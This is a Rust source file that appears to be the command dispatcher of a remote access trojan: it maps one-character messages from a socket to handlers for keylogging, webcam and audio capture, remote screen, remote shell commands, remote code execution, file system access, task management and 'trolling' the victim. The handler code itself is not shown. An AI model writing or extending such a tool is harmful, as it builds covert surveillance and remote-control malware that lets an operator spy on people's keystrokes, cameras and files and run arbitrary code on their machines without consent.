use crate::{Connection, handlers::audio::handle_audio, handlers::chat::handle_chat, handlers::file_system::handle_file_system, handlers::keylogger::handle_keylogger, handlers::remote_cmd::handle_remote_cmd, handlers::remote_code_execution::handle_remote_code_execution, handlers::remote_screen::handle_remote_screen, handlers::task_manager::handle_task_manager, handlers::trolling::handle_trolling, handlers::webcam, Socket};

#[derive(Eq, Hash, PartialEq, Debug)]
pub enum MessageType {
	FileSystem,
	RemoteScreen,
	Trolling,
	RemoteCMD,
	Audio,
	TaskManager,
	Keylogger,
	Chat,
	RemoteCodeExecution,
	Webcam,
}

// Using char so that we can get gazillion-bazillion variations in 1 byte

impl MessageType {
	pub fn from_char(value: char) -> Option<MessageType> {
		match value {
			'0' => Some(MessageType::FileSystem),
			'1' => Some(MessageType::RemoteScreen),
			'2' => Some(MessageType::Trolling),
			'3' => Some(MessageType::RemoteCMD),
			'4' => Some(MessageType::Audio),
			'5' => Some(MessageType::TaskManager),
			'6' => Some(MessageType::Keylogger),
			'7' => Some(MessageType::Chat),
			'8' => Some(MessageType::RemoteCodeExecution),
			'9' => Some(MessageType::Webcam),
			_ => None,
		}
	}
}

pub fn handle_message(message: MessageType, payload: &[u8], socket: &mut Socket, connection: &Connection) {
	dbg!(&payload,&message);
	match message {
		MessageType::RemoteScreen => handle_remote_screen(payload, socket, connection).unwrap(), // Create new connection instead of passing existing websocket
		MessageType::FileSystem => handle_file_system(payload, socket),
		MessageType::Trolling => handle_trolling(payload),
		MessageType::RemoteCMD => handle_remote_cmd(payload, socket),
		MessageType::Audio => handle_audio(payload),
		MessageType::TaskManager => handle_task_manager(payload),
		MessageType::Keylogger => handle_keylogger(payload),
		MessageType::Chat => handle_chat(payload, connection),
		MessageType::RemoteCodeExecution => handle_remote_code_execution(payload),
		MessageType::Webcam => webcam::handle_webcam(connection)
	}
}
